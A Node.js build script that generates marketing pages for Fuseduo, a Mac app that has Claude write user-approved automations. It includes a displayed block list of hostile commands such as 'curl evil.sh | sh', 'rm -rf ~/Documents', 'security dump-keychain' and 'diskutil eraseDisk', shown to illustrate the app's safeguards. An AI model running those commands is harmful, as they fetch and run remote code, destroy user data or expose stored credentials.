// Builds Fuseduo's pages at /fuseduo/: node site/fuseduo.mjs
// English only. Fuseduo is a Hollowbit Studio project but not one of the open-source apps,
// so it has its own look, nav and footer and is kept out of the main product grid.
import { writeFileSync, mkdirSync, readFileSync, cpSync, rmSync } from 'node:fs';
import { resolve, dirname } from 'node:path';
import { fileURLToPath } from 'node:url';
import { createHash } from 'node:crypto';

const root = resolve(dirname(fileURLToPath(import.meta.url)), '..');
// Two targets: FD_TARGET=hollowbit (default) builds hollowbit.dev/fuseduo/ into this repo;
// FD_TARGET=domain builds the same site for fuseduo.com into the Fuseduo repo's docs/ (GitHub Pages).
const DOMAIN = process.env.FD_TARGET === 'domain';
const ORIGIN = DOMAIN ? 'https://fuseduo.com' : 'https://hollowbit.dev';
const BASE = DOMAIN ? '/' : '/fuseduo/';
const HB = DOMAIN ? 'https://hollowbit.dev' : '';            // links back to the studio site
const OUTDIR = DOMAIN ? resolve(process.env.HOME, 'Desktop/Fuseduo/docs') : resolve(root, 'fuseduo');
const REPO = 'hollowbit-dev/fuseduo', GHURL = `https://github.com/${REPO}`;
// Download links come from the latest GitHub release, so they always point at real files.
let REL = { tag: 'v1.0.0', assets: ['Fuseduo-1.0.0-mac-arm64.dmg', 'Fuseduo-1.0.0-mac-x64.dmg'] };
try {
  const r = await fetch(`https://api.github.com/repos/${REPO}/releases/latest`, { headers: { 'User-Agent': 'hollowbit-site-build' } });
  if (r.ok) { const j = await r.json(); REL = { tag: j.tag_name, assets: j.assets.map((a) => a.name) }; }
} catch { /* offline: fallback */ }
const dlLink = (re) => { const n = REL.assets.find((a) => re.test(a)); return n ? `${GHURL}/releases/latest/download/${n}` : `${GHURL}/releases/latest`; };
const DL = { arm: dlLink(/mac-arm64\.dmg$/), intel: dlLink(/mac-x64\.dmg$/), version: REL.tag.replace(/^v/, '') };
const hash = (f) => createHash('md5').update(readFileSync(resolve(root, f))).digest('hex').slice(0, 8);
const V = { css: hash('fuseduo/assets/fd.css'), js: hash('fuseduo/assets/fd.js'), fx: hash('fuseduo/assets/fx.js') };
const OG = (() => { try { return hash('fuseduo/assets/img/og.png'); } catch { return '0'; } })();
const esc = (s) => String(s).replace(/[&<>"]/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]));

const SOCIALS = [
  ['X', 'https://x.com/hollowbitstudio', '<path fill="currentColor" d="M17.8 3h3.1l-6.8 7.7L22 21h-6.2l-4.9-6.3L5.3 21H2.2l7.2-8.3L1.8 3h6.4l4.4 5.8L17.8 3Zm-1.1 16.2h1.7L7.4 4.7H5.6l11.1 14.5Z"/>'],
  ['YouTube', 'https://www.youtube.com/@hollowbitstudio', '<path fill="currentColor" d="M23 7.2a3 3 0 0 0-2.1-2.1C19 4.6 12 4.6 12 4.6s-7 0-8.9.5A3 3 0 0 0 1 7.2 31 31 0 0 0 .5 12a31 31 0 0 0 .5 4.8 3 3 0 0 0 2.1 2.1c1.9.5 8.9.5 8.9.5s7 0 8.9-.5a3 3 0 0 0 2.1-2.1 31 31 0 0 0 .5-4.8 31 31 0 0 0-.5-4.8ZM9.7 15.1V8.9l5.8 3.1-5.8 3.1Z"/>'],
  ['TikTok', 'https://www.tiktok.com/@hollowbitstudio', '<path fill="currentColor" d="M16.6 2h-3.4v13.4a2.9 2.9 0 1 1-2-2.8V9.1a6.3 6.3 0 1 0 5.4 6.3V8.6a8 8 0 0 0 4.6 1.5V6.7a4.6 4.6 0 0 1-4.6-4.7Z"/>'],
  ['Instagram', 'https://www.instagram.com/hollowbitstudio', '<path fill="currentColor" d="M12 2.2c3.2 0 3.6 0 4.8.1 3.3.1 4.8 1.7 4.9 4.9.1 1.3.1 1.6.1 4.8s0 3.6-.1 4.8c-.1 3.2-1.7 4.8-4.9 4.9-1.3.1-1.6.1-4.8.1s-3.6 0-4.8-.1c-3.3-.1-4.8-1.7-4.9-4.9C2.2 15.6 2.2 15.2 2.2 12s0-3.6.1-4.8C2.4 3.9 3.9 2.4 7.2 2.3 8.4 2.2 8.8 2.2 12 2.2Zm0 4.7a5.1 5.1 0 1 0 0 10.2 5.1 5.1 0 0 0 0-10.2Zm0 8.4a3.3 3.3 0 1 1 0-6.6 3.3 3.3 0 0 1 0 6.6Zm5.3-9.8a1.2 1.2 0 1 0 0 2.4 1.2 1.2 0 0 0 0-2.4Z"/>'],
  ['Reddit', 'https://www.reddit.com/user/hollowbitstudio', '<path fill="currentColor" d="M22 12.1a2.2 2.2 0 0 0-3.7-1.6 10.8 10.8 0 0 0-5.8-1.8l1-4.6 3.2.7a1.6 1.6 0 1 0 .2-1l-3.6-.8a.5.5 0 0 0-.6.4l-1.1 5.3a10.8 10.8 0 0 0-5.9 1.8A2.2 2.2 0 1 0 3.3 14a4.3 4.3 0 0 0 0 .7c0 3.4 3.9 6.1 8.7 6.1s8.7-2.7 8.7-6.1a4.3 4.3 0 0 0 0-.7 2.2 2.2 0 0 0 1.3-1.9ZM7 13.7a1.6 1.6 0 1 1 1.6 1.6A1.6 1.6 0 0 1 7 13.7Zm9 4.2a5.8 5.8 0 0 1-4 1.2 5.8 5.8 0 0 1-4-1.2.4.4 0 0 1 .6-.6 5 5 0 0 0 3.4 1 5 5 0 0 0 3.4-1 .4.4 0 1 1 .6.6Zm-.4-2.6a1.6 1.6 0 1 1 1.6-1.6 1.6 1.6 0 0 1-1.6 1.6Z"/>'],
];
const socials = () => `<div class="socials">${SOCIALS.map(([n, u, d]) => `<a href="${u}" aria-label="${n}" title="${n}" rel="me noopener"><svg viewBox="0 0 24 24" width="18" height="18" aria-hidden="true">${d}</svg></a>`).join('')}</div>`;
const I = (d) => `<svg viewBox="0 0 24 24" aria-hidden="true"><path d="${d}"/></svg>`;
const ICONS = {
  key: 'M15 7a3 3 0 1 1-3 3m3-3a3 3 0 0 0-3 3m3-3h.01M12 10 4 18v2h3v-2h2v-2h2l1.5-1.5',
  eye: 'M2.5 12s3.5-6.5 9.5-6.5 9.5 6.5 9.5 6.5-3.5 6.5-9.5 6.5S2.5 12 2.5 12Zm9.5 2.5a2.5 2.5 0 1 0 0-5 2.5 2.5 0 0 0 0 5Z',
  bolt: 'M13 2.5 4.5 13.5H12l-1 8 8.5-11H12l1-8Z',
  check: 'M4.5 12.5 9.5 17.5 19.5 6.5',
  shield: 'M12 3 4.5 6v5.5c0 4.6 3.2 8.4 7.5 9.5 4.3-1.1 7.5-4.9 7.5-9.5V6L12 3Zm-3 9 2.2 2.2L15.5 10',
  undo: 'M9 14 4 9l5-5M4.5 9H14a6 6 0 0 1 0 12h-3',
  mac: 'M4 5.5h16v10H4zM9 19.5h6M12 15.5v4',
  list: 'M9 6.5h11M9 12h11M9 17.5h11M4.5 6.5h.01M4.5 12h.01M4.5 17.5h.01',
  star: 'm12 3.5 2.6 5.3 5.9.9-4.3 4.1 1 5.8L12 16.9l-5.2 2.7 1-5.8-4.3-4.1 5.9-.9z',
  gauge: 'M4 15a8 8 0 1 1 16 0M12 15l4-5M4 19.5h16',
};
const card = (ic, title, body, d = 0) => `<div class="card" data-reveal style="--d:${d}s"><div class="ic">${I(ICONS[ic])}</div><h3>${title}</h3><p>${body}</p></div>`;

const NAV = [['how-it-works/', 'How it works'], ['safety/', 'Safety'], ['support/', 'Support']];
function page({ path, title, desc, body, demo }) {
  const url = ORIGIN + BASE + path;
  const nav = NAV.map(([p, n]) => `<a href="${BASE}${p}"${p === path ? ' aria-current="page"' : ''}>${n}</a>`).join('');
  return `<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>${esc(title)}</title>
<meta name="description" content="${esc(desc)}">
<link rel="canonical" href="${url}">
<meta name="theme-color" content="#7a63ff">
<meta property="og:type" content="website">
<meta property="og:site_name" content="Fuseduo by Hollowbit Studio">
<meta property="og:url" content="${url}">
<meta property="og:title" content="${esc(title)}">
<meta property="og:description" content="${esc(desc)}">
<meta property="og:image" content="${ORIGIN}${BASE}assets/img/og.png?v=${OG}">
<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="630">
<meta property="og:image:alt" content="Fuseduo: drop one Mac app onto another, get an automation.">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:site" content="@hollowbitstudio">
<meta name="twitter:title" content="${esc(title)}">
<meta name="twitter:description" content="${esc(desc)}">
<meta name="twitter:image" content="${ORIGIN}${BASE}assets/img/og.png?v=${OG}">
<link rel="icon" href="${BASE}assets/img/icon-64.png" type="image/png">
<link rel="apple-touch-icon" href="${BASE}assets/img/icon-256.png">
<link rel="preload" href="${BASE}assets/fonts/Geist-Variable.woff2" as="font" type="font/woff2" crossorigin>
<link rel="stylesheet" href="${BASE}assets/fd.css?v=${V.css}">
<script type="application/ld+json">${JSON.stringify({ '@context': 'https://schema.org', '@type': 'SoftwareApplication', name: 'Fuseduo', operatingSystem: 'macOS', applicationCategory: 'UtilitiesApplication', softwareVersion: DL.version, downloadUrl: DL.arm, offers: { '@type': 'Offer', price: '0', priceCurrency: 'USD' }, description: 'Drop one Mac app onto another and get an automation, written as a real script that you read and approve before it runs.', url: ORIGIN + BASE, publisher: { '@type': 'Organization', name: 'Hollowbit Studio', url: ORIGIN + '/' } })}</script>
<script>document.documentElement.classList.add('js')</script>
</head>
<body>
<div class="wash" aria-hidden="true"><i></i><i></i><i></i><i></i></div><div class="dots" aria-hidden="true"></div><div class="dots-lit" aria-hidden="true"></div><div class="grain" aria-hidden="true"></div>
${demo ? '<svg width="0" height="0" style="position:absolute" aria-hidden="true"><filter id="fd-goo"><feGaussianBlur in="SourceGraphic" stdDeviation="10" result="b"/><feColorMatrix in="b" values="1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 22 -9"/></filter></svg>' : ''}
<header class="nav"><div class="nav-in glass">
  <a class="logo" href="${BASE}"><img src="${BASE}assets/img/icon-64.png" alt="" width="30" height="30">Fuseduo <small>by Hollowbit</small></a>
  <nav class="links" aria-label="Fuseduo">${nav}<a class="btn btn-brand sm" href="${BASE}#download">Download</a></nav>
  <button class="menu-btn" aria-label="Menu" aria-expanded="false"><svg viewBox="0 0 24 24"><path d="M4 8h16M4 16h16"/></svg></button>
</div></header>
<main>
${body}
</main>
<footer class="foot"><div class="wrap">
  <div class="foot-in">
    <div>
      <a class="logo" href="${BASE}"><img src="${BASE}assets/img/icon-64.png" alt="" width="30" height="30">Fuseduo</a>
      <p>Drop one Mac app onto another. Get an automation. Free and open source. A project by <a href="${HB}/">Hollowbit Studio</a>.</p>
    </div>
    <nav aria-label="Footer">
      <div><b>Fuseduo</b><a href="${BASE}">Overview</a><a href="${BASE}how-it-works/">How it works</a><a href="${BASE}safety/">Safety</a><a href="${BASE}support/">Support</a><a href="${BASE}#download">Download</a><a href="${GHURL}">GitHub</a></div>
      <div><b>More free apps</b><a href="https://fileshaper.app/">Fileshaper</a><a href="https://captionshaper.app/">Captionshaper</a><a href="https://hollowbit.dev/diskshaper/">Diskshaper</a><a href="https://hollowbit.dev/writeshaper/">Writeshaper</a></div>
      <div><b>Hollowbit Studio</b><a href="${HB}/">Home</a><a href="${HB}/about/">About</a><a href="${HB}/contact/">Contact</a><a href="${HB}/privacy/">Privacy</a></div>
    </nav>
  </div>
  <p class="copy">© ${new Date().getFullYear()} Hollowbit Studio. Fuseduo is an independent project and isn’t affiliated with Apple or Anthropic. App names and icons belong to their owners.</p>
</div></footer>
${demo ? `<dialog class="film" id="film" aria-label="The Fuseduo film"><button class="close" aria-label="Close">×</button><video controls playsinline preload="none" poster="${BASE}assets/video/fuseduo-film-poster.jpg" data-src="${BASE}assets/video/fuseduo-film.mp4"></video></dialog>` : ''}
<script src="${BASE}assets/fd.js?v=${V.js}" defer></script>
<script src="${BASE}assets/fx.js?v=${V.fx}" defer></script>
</body>
</html>
`;
}

const words = (t) => t.split(' ').map((w, i) => `<span class="w" style="--i:${i}">${w}</span>`).join(' ');
const DLI = I('M12 4v11m0 0 4-4m-4 4-4-4M5 19.5h14'), PLAY = I('M8 5.5v13l10-6.5z');
const dlButtons = (size = 'big') => `<div class="dl-row"><a class="btn btn-brand ${size}" href="${DL.arm}">${DLI}Download for Mac</a><a class="btn btn-glass ${size}" href="${DL.intel}">Intel Mac</a></div>
  <p class="dl-sub">Version ${DL.version} · Free and open source · <a href="${GHURL}">View on GitHub</a> · <a href="${GHURL}/releases/latest">All downloads</a></p>`;
const firstRun = `<p class="first-run"><b>First launch:</b> right-click Fuseduo in Applications and choose <b>Open</b> (it isn’t signed with a paid Apple certificate). You’ll need <a href="https://claude.com/code">Claude Code</a> or an Anthropic API key.</p>`;
const notify = `<section class="section" id="download"><div class="wrap narrow"><div class="band" data-reveal>
  <img class="big-icon" src="${BASE}assets/img/icon-256.png" alt="" width="108" height="108">
  <h2>Get Fuseduo.</h2>
  <p class="lede">Free for Mac. Drop one app on another and see what they can do together.</p>
  ${dlButtons()}
  ${firstRun}
  ${socials()}
</div></div></section>`;

const FUSIONS = [
  ['music', 'notes', 'Listening log', 'The song playing now, added to a note'],
  ['safari', 'notes', 'Save my open tabs', 'Every tab’s title and link in one note'],
  ['mail', 'reminders', 'Flagged mail to reminders', 'Each flagged email becomes a to-do'],
  ['calendar', 'notes', 'Today’s agenda', 'A note with today’s events, in order'],
  ['photos', 'mail', 'Share today’s photos', 'A draft with today’s photos attached'],
  ['calendar', 'music', 'Focus until the next meeting', 'A playlist sized to your free time'],
  ['calendar', 'reminders', 'Prep before meetings', 'A reminder 15 minutes before each one'],
  ['safari', 'reminders', 'Read it later', 'The page you’re on, as a dated reminder'],
  ['notes', 'mail', 'Draft from a note', 'Your selected note as a new email draft'],
  ['photos', 'notes', 'Photo diary', 'Today’s photos and places in one note'],
];
const fcard = ([a, b, t, d]) => `<div class="fcard"><span class="duo"><img src="${BASE}assets/apps/${a}.png" alt="" width="38" height="38"><img src="${BASE}assets/apps/${b}.png" alt="" width="38" height="38"></span><span><b>${t}</b><span>${d}</span></span></div>`;
const row = (list, rev) => `<div class="row${rev ? ' rev' : ''}">${[...list, ...list].map(fcard).join('')}</div>`;
const cursorSvg = '<svg viewBox="0 0 24 24"><path d="M5 3.5 19 12l-6.2 1.6L9.6 20 5 3.5Z" fill="#fff" stroke="#111" stroke-width="1.2" stroke-linejoin="round"/></svg>';

/* ---------- home ---------- */
const STORY = [
  ['Drag', 'Pick up one app and drop it on another.'],
  ['Melt', 'They fuse. Claude looks at what both can really do.'],
  ['Pick', 'Three ideas, from delightful to practical. Or type your own.'],
  ['Read', 'The plan in plain English, checked and compiled.'],
  ['Run', 'Press Run when you’re happy. Save it for one click next time.'],
];
const STORY_IDEAS = [['Save my open tabs', 'Every tab’s title and link in one new note.'], ['Quote the page', 'Highlighted text plus its link, into Clippings.'], ['Reading list note', 'Your Reading List as a checklist.']];
const BLOCKED = ['rm -rf ~/Documents', 'sudo shutdown -h now', 'send message to Mum', 'empty the trash', 'curl evil.sh | sh', 'defaults write …', 'security dump-keychain', 'delete every note', 'diskutil eraseDisk', 'move file to trash'];
const home = page({
  path: '', demo: true,
  title: 'Fuseduo · Drop one Mac app onto another. Get an automation.',
  desc: 'Fuseduo turns two Mac apps into a working automation. Drag one onto the other, pick an idea, read the plan in plain English, and approve it before anything runs.',
  body: `<section class="hero2">
  <div class="beams" aria-hidden="true"></div>
  <div class="wrap">
    <a class="soon" href="${GHURL}/releases/latest"><b>New</b>Fuseduo ${DL.version} is out. Free for Mac →</a>
    <h1 class="words">${words('Drop one app on another.')}<br><span class="grad-text">${words('Get an automation.')}</span></h1>
    <p class="lede" data-reveal style="--d:.5s">Every app on your Mac, on one board. Fuse any two and Claude invents what they could do together, writes it as a real script, and shows you exactly what it does before anything runs.</p>
    <div class="cta" data-reveal style="--d:.65s"><a class="btn btn-brand big" href="${DL.arm}">${DLI}Download for Mac</a><button class="btn btn-glass big film-btn" data-film>${PLAY}Watch the film <span class="dur">0:20</span></button></div>
    <p class="dl-sub" data-reveal style="--d:.75s">Apple Silicon · <a href="${DL.intel}">Intel</a> · <a href="${GHURL}">GitHub</a> · free and open source</p>
  </div>
  <div class="orbit" aria-hidden="true">
    <div class="orbit-ring r1"></div><div class="orbit-ring r2"></div>
    <div class="core"><span class="halo"></span><span class="pulse"></span><span class="pulse p2"></span><img src="${BASE}assets/img/icon-256.png" alt="" width="150" height="150"></div>
    <canvas class="hero-sparks"></canvas>
  </div>
</section>

<section class="section tight"><div class="wrap">
  <div class="stats" data-reveal>
    <div class="stat"><b><span data-count="3">0</span></b><span>ideas for every pair</span></div>
    <div class="stat"><b>~<span data-count="9" data-suffix="s">0</span></b><span>to a built script on Fast, in testing</span></div>
    <div class="stat"><b><span data-count="12">0</span></b><span>kinds of risky script blocked</span></div>
    <div class="stat"><b><span data-count="0">0</span></b><span>scripts that run without your OK</span></div>
  </div>
</div></section>

<section class="story" aria-label="How a fusion happens">
  <div class="story-pin">
    <div>
      <p class="eyebrow"><span class="pip"></span>One fusion, frame by frame</p>
      <h2 style="margin-bottom:26px">Safari + Notes,<br><span class="grad-text">in five moves.</span></h2>
      <ol class="story-steps">${STORY.map(([b, t], i) => `<li data-n="${i + 1}"><b>${b}</b><span>${t}</span></li>`).join('')}</ol>
      <div class="story-bar"><i></i></div>
    </div>
    <div class="story-vis">
      <div class="sv-goo"><span class="sv-blob a" style="background:#33b5ff"></span><span class="sv-blob b" style="background:#f6c945"></span></div>
      <img class="sv sv-app sv-a" src="${BASE}assets/apps/safari.png" alt="">
      <img class="sv sv-app sv-b" src="${BASE}assets/apps/notes.png" alt="">
      <div class="sv sv-orb"></div>
      ${STORY_IDEAS.map(([t, d]) => `<div class="sv sv-card"><b>${t}</b><p>${d}</p></div>`).join('')}
      <div class="sv sv-plan">
        <h4>Save my open tabs</h4><div class="sub">Safari + Notes · Low risk · AppleScript</div>
        <ol><li><i>1</i>Goes through every Safari window and tab</li><li><i>2</i>Collects each page’s title and link</li><li><i>3</i>Creates a new dated note with the list</li><li><i>✓</i>Compiles. Nothing on the block-list.</li></ol>
        <div class="sv-run">${I('M7 4.5v15l12.5-7.5z')}Approve and run</div>
        <div class="sv-done">✓ Saved 14 tabs to “Tabs · Today”</div>
      </div>
      <canvas></canvas>
    </div>
  </div>
</section>

<section class="section" id="try"><div class="wrap">
  <div class="section-head" data-reveal><p class="eyebrow"><span class="pip"></span>Try it yourself</p><h2>Go on, <span class="grad-text">fuse something.</span></h2><p class="lede">This board is live. Drag any app onto another and walk through a fusion.</p></div>
</div>
<div class="demo-wrap" data-reveal>
  <div class="demo-glow"></div>
  <div class="window">
    <div class="titlebar"><i></i><i></i><i></i><span>Fuseduo</span><span class="hint" id="hint"></span></div>
    <div class="stage" id="stage">
      <div class="board" aria-label="Demo apps"></div>
      <div class="fx"><div class="goo"><span class="blob a"></span><span class="blob b"></span></div><span class="ring"></span><span class="ring"></span><span class="flash"></span></div>
      <canvas class="sparks" aria-hidden="true"></canvas>
      <div class="ghost" hidden><img alt=""></div>
      <div class="cursor" aria-hidden="true">${cursorSvg}</div>
      <aside class="dpanel" aria-live="polite">
        <div class="dp-head"><div class="dp-pair"></div><div class="dp-eyebrow"></div><div class="dp-title"></div><div class="dp-stage"></div><div class="dp-steps"><i></i><i></i><i></i><i></i></div></div>
        <div class="dp-body"></div>
        <div class="dp-foot"></div>
      </aside>
    </div>
  </div>
  <p class="demo-note">Example ideas. In the app, Claude writes them for whatever two apps you choose. <button id="replay">Replay</button></p>
</div></section>

<section class="section"><div class="wrap">
  <div class="section-head" data-reveal><p class="eyebrow"><span class="pip"></span>Built in</p><h2>Powerful. <span class="grad-text">Careful.</span> Quick.</h2></div>
  <div class="bento">
    <div class="tile w2" data-reveal><h3>Your Claude, your choice</h3><p>Use your own Claude Code sign-in and plan, or an Anthropic API key. Switch any time in Settings.</p><div class="art"><div class="term"></div></div></div>
    <div class="tile" data-reveal style="--d:.06s"><h3>Best or Fast</h3><p>Real build times from testing.</p><div class="art"><div class="race">
      <div class="race-row"><div><b>Best · Opus 5.5</b><span>23.8 s</span></div><div class="race-bar best" style="--d:9.5s"><i></i></div></div>
      <div class="race-row"><div><b>Fast · Sonnet 5.5</b><span>8.5 s</span></div><div class="race-bar fast" style="--d:3.4s"><i></i></div></div>
    </div></div></div>
    <div class="tile" data-reveal><h3>Nothing runs unseen</h3><p>You press Run. Every time.</p><div class="art"><div class="approve"><span class="ripple"></span><span class="btn btn-brand">Approve and run</span><span class="ok">✓ Done</span><svg class="hand" viewBox="0 0 24 24"><path d="M5 3.5 19 12l-6.2 1.6L9.6 20 5 3.5Z" fill="#fff" stroke="#111" stroke-width="1.2" stroke-linejoin="round"/></svg></div></div></div>
    <div class="tile" data-reveal style="--d:.06s"><h3>A hard block-list</h3><p>Risky scripts never get a Run button.</p><div class="art"><div class="blk"><div class="blk-col">${[...BLOCKED, ...BLOCKED].map((b, i) => `<span style="--sd:${(i % BLOCKED.length) * 1.4}s">${b}</span>`).join('')}</div></div></div></div>
    <div class="tile" data-reveal style="--d:.12s"><h3>Any two apps</h3><p>Every app on your Mac can fuse with every other.</p><div class="art"><div class="pairs">${['notes', 'calendar', 'reminders', 'mail', 'safari', 'music', 'photos', 'messages'].map((a) => `<img src="${BASE}assets/apps/${a}.png" alt="">`).join('')}<svg><defs><linearGradient id="beamGrad"><stop offset="0" stop-color="#a78bfa"/><stop offset=".5" stop-color="#22d3ee"/><stop offset="1" stop-color="#f472b6"/></linearGradient></defs><path/></svg></div></div></div>
    <div class="tile w3" data-reveal><h3>Saved fusions, one click away</h3><p>Keep the ones you love. See when each last ran and whether it worked.</p><div class="art"><div class="stack">${FUSIONS.slice(0, 5).map(([a, b, t]) => `<div class="scard"><span class="duo"><img src="${BASE}assets/apps/${a}.png" alt=""><img src="${BASE}assets/apps/${b}.png" alt=""></span><span><b>${t}</b><small><i></i>Ran just now</small></span><span class="play"><svg viewBox="0 0 24 24"><path d="M7 4.5v15l12.5-7.5z"/></svg></span></div>`).join('')}</div></div></div>
  </div>
</div></section>

<section class="section tight" style="overflow:hidden"><div class="section-head wrap" data-reveal><p class="eyebrow"><span class="pip"></span>Any two apps</p><h2>Small magic, <span class="grad-text">made to order.</span></h2></div>
  <div class="marquee tilt" data-reveal>${row(FUSIONS.slice(0, 5))}${row(FUSIONS.slice(5), true)}${row([...FUSIONS].reverse().slice(0, 5))}</div>
</section>

<section class="section"><div class="wrap">
  <div class="section-head" data-reveal><p class="eyebrow"><span class="pip"></span>The real app</p><h2>Read it. Approve it. <span class="grad-text">Run it.</span></h2><p class="lede">Steps in plain English, a risk rating, the permissions it needs and how to undo it. The script is right there if you want to look.</p><div class="cta"><button class="btn btn-glass film-btn" data-film>${PLAY}Watch the 20-second film</button></div></div>
  <div class="shot"><div class="shot-in"><img src="${BASE}assets/img/app-plan.webp" alt="Fuseduo showing a fusion of Music and Notes, with its steps, a low risk rating and the AppleScript it wrote." width="1600" height="1000" loading="lazy" decoding="async"></div></div>
</div></section>

<section class="section tight"><div class="wrap">
  <div class="section-head" data-reveal><p class="eyebrow"><span class="pip"></span>From the same studio</p><h2>More free apps from <span class="grad-text">Hollowbit.</span></h2><p class="lede">Free, open source, and they never upload your files.</p></div>
  <div class="grid2 sisters">
    ${[['Fileshaper', 'https://fileshaper.app/', 'Compress video for Discord, convert iPhone photos, merge and sign PDFs.'], ['Captionshaper', 'https://captionshaper.app/', 'Word-timed subtitles and TikTok-style captions, made on your computer.'], ['Diskshaper', 'https://hollowbit.dev/diskshaper/', 'See what is eating your storage and clean only what is safe.'], ['Writeshaper', 'https://hollowbit.dev/writeshaper/', 'Fix and polish your writing in any app, privately.']].map(([n, u, d], i) => `<a class="card sister" href="${u}" data-reveal style="--d:${i * 0.06}s"><h3>${n} →</h3><p>${d}</p></a>`).join('')}
  </div>
</div></section>

<section class="finale" id="download">
  <div class="beams" aria-hidden="true"></div>
  <div class="wrap narrow" data-reveal>
    <div class="core"><span class="halo"></span><span class="pulse"></span><span class="pulse p2"></span><img src="${BASE}assets/img/icon-256.png" alt="" width="150" height="150"></div>
    <h2>Fuse <span class="grad-text">anything.</span></h2>
    <p class="lede">Free for Mac, open source, and yours to remix.</p>
    ${dlButtons()}
    ${firstRun}
    ${socials()}
  </div>
</section>`,
});

/* ---------- how it works ---------- */
const how = page({
  path: 'how-it-works/',
  title: 'How Fuseduo works · Fuseduo',
  desc: 'Drag one Mac app onto another, pick one of three ideas, read the plan and approve it. How Fuseduo turns two apps into a real AppleScript, JavaScript or zsh automation.',
  body: `<section class="page-head"><div class="wrap narrow">
  <p class="eyebrow"><span class="pip"></span>How it works</p>
  <h1 class="words" style="font-size:clamp(40px,6vw,72px)">${words('From two icons to a working automation.')}</h1>
  <p class="lede" data-reveal style="--d:.4s">Four steps, about half a minute, and you stay in charge of every one.</p>
</div></section>

<section class="section tight"><div class="wrap steps">
  <div class="step"><div class="step-text" data-reveal><div class="step-num">1</div><h2>Drag one app onto another.</h2><p>Your apps sit on a glass board, grouped into Favourites, Recent and categories. Pick one up and drop it on another. They melt together.</p><ul><li>Every app installed on your Mac, found automatically</li><li>Star the ones you use most</li><li>Hover a shelf in the sidebar while dragging to switch to it</li></ul></div>
    <div class="frame crop" data-reveal style="--d:.1s;--pos:0 0"><img src="${BASE}assets/img/app-drag.webp" alt="Dragging the Music icon onto Notes on the Fuseduo board." width="1600" height="1000" loading="lazy" decoding="async"></div></div>
  <div class="step"><div class="step-text" data-reveal><div class="step-num">2</div><h2>Pick one of three ideas.</h2><p>Claude looks at what the two apps can actually do and suggests three automations, from delightful to practical. Or type exactly what you want.</p><ul><li>Ideas often start loading while you’re still hovering</li><li>Ideas for a pair you’ve fused before come back instantly</li><li>Not quite right? Ask for three more</li></ul></div>
    <div class="frame crop" data-reveal style="--d:.1s;--pos:100% 0"><img src="${BASE}assets/img/app-ideas.webp" alt="Three fusion ideas for Music and Notes." width="1600" height="1000" loading="lazy" decoding="async"></div></div>
  <div class="step"><div class="step-text" data-reveal><div class="step-num">3</div><h2>Read the plan.</h2><p>Fuseduo writes the automation as a real script, checks that it compiles, fixes it once if it doesn’t, and explains it step by step.</p>
<pre class="code"><span class="c">-- Today’s agenda note: Calendar + Notes</span>
<span class="k">tell</span> application <span class="s">"Calendar"</span>
  <span class="k">set</span> todays <span class="k">to</span> events <span class="k">whose</span> start date ≥ dayStart
<span class="k">end tell</span>
<span class="k">tell</span> application <span class="s">"Notes"</span> <span class="k">to</span> make new note …</pre></div>
    <div class="frame crop" data-reveal style="--d:.1s;--pos:100% 0"><img src="${BASE}assets/img/app-plan.webp" alt="A fusion plan with steps, a risk rating and the script." width="1600" height="1000" loading="lazy" decoding="async"></div></div>
  <div class="step"><div class="step-text" data-reveal><div class="step-num">4</div><h2>Run it, then keep it.</h2><p>Press Approve and run. Save the fusions you like and they wait on your shelf, showing when each one last ran and whether it worked. Run them again in one click.</p></div>
    <div class="frame crop" data-reveal style="--d:.1s;--pos:0 100%"><img src="${BASE}assets/img/app-board.webp" alt="The Fuseduo board with saved fusions on the shelf." width="1600" height="1000" loading="lazy" decoding="async"></div></div>
</div></section>

<section class="section"><div class="wrap">
  <div class="section-head" data-reveal><p class="eyebrow"><span class="pip"></span>Under the hood</p><h2>Real scripts, not a black box.</h2></div>
  <div class="grid3">
    ${card('list', 'AppleScript', 'For apps with a scripting dictionary, like Notes, Calendar, Mail, Music, Reminders and Safari.')}
    ${card('bolt', 'JavaScript for Automation', 'The same app control as AppleScript, written in JavaScript, when that fits better.', 0.08)}
    ${card('mac', 'zsh', 'For files and command-line tools. New files only go to a Fusions folder on your Desktop.', 0.16)}
  </div>
  <div class="grid2" style="margin-top:16px">
    <div class="card" data-reveal><div class="ic">${I(ICONS.key)}</div><h3>Which Claude it uses</h3><p>With Claude Code installed and signed in, Fuseduo runs on your existing Claude plan. Or add an Anthropic API key in Settings; it’s stored with your Mac’s keychain.</p></div>
    <div class="card" data-reveal style="--d:.08s"><div class="ic">${I(ICONS.gauge)}</div><h3>Best or Fast</h3><p>Choose the model in Settings.</p><div class="models"><div class="model"><b>Best</b><span>Claude Opus 5.5. The most careful.</span></div><div class="model"><b>Fast</b><span>Claude Sonnet 5.5. About three times quicker.</span></div></div></div>
  </div>
</div></section>
${notify}`,
});

/* ---------- safety ---------- */
const safety = page({
  path: 'safety/',
  title: 'Safety · Fuseduo',
  desc: 'Fuseduo never runs a script you haven’t approved. Plain-English plans, a risk rating, a compile check and a safety block-list, and what is and isn’t sent to Claude.',
  body: `<section class="page-head"><div class="wrap narrow">
  <p class="eyebrow"><span class="pip"></span>Safety</p>
  <h1 class="words" style="font-size:clamp(40px,6vw,72px)">${words('Nothing runs until you say so.')}</h1>
  <p class="lede" data-reveal style="--d:.4s">Fuseduo writes code that controls your apps, so it’s built to be careful by default and honest about what it does.</p>
</div></section>

<section class="section tight"><div class="wrap grid3">
  ${card('eye', 'You approve every run', 'Scripts only run when you press Run. Nothing runs in the background, on a schedule or by itself.')}
  ${card('list', 'Plain-English steps', 'Every fusion is explained step by step, so you know what it touches without reading code.', 0.06)}
  ${card('gauge', 'An honest risk rating', 'Low means it only reads, opens or creates new things. Medium means it changes something, like making a draft. Anything else is high.', 0.12)}
  ${card('check', 'Compile check', 'Each script is compiled before you see it. If it fails, Claude gets one try to fix it, and a script that still won’t compile can’t be run.', 0.18)}
  ${card('undo', 'How to undo it', 'Every plan ends with how to reverse what it did. Fusions only create new files, never overwrite yours.', 0.24)}
  ${card('mac', 'Runs on your Mac', 'Scripts run locally with macOS’s own tools, and macOS asks before an app can be controlled the first time.', 0.3)}
</div></section>

<section class="section"><div class="wrap">
